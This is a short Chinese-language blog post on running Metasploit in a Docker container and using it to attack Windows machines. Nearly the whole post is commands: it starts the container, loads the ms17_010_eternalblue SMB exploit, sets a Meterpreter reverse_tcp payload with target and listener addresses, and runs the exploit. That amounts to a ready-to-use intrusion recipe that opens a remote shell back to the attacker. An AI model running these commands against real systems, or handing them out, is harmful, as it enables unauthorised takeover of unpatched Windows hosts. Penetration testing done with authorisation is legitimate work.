---
layout: post
title: docker 版本安装 msf 
categories: [安全工具]
description: docker 版本安装 msf 
keywords: 安全工具,msf
---

# 简介

创建容器：

docker run -it -d --name msf -p 1234:1234 linuxkonsult/kali-metasploit  

进入容器：

docker exec -it msf /bin/bash

## 利用ms17_010_eternalblue模块进行渗透：
打开msf框架：

msfconsole

使用ms17_010_eternalblue模块及各个配置：

use exploit/windows/smb/ms17_010_eternalblue

set payload windows/x64/meterpreter/reverse_tcp

show options

set rhost 目标主机IP

set lhost 监听的主机IP（在这里是docker主机的IP）

set lport 监听的端口（示例中为设置的映射的端口1234）

exploit
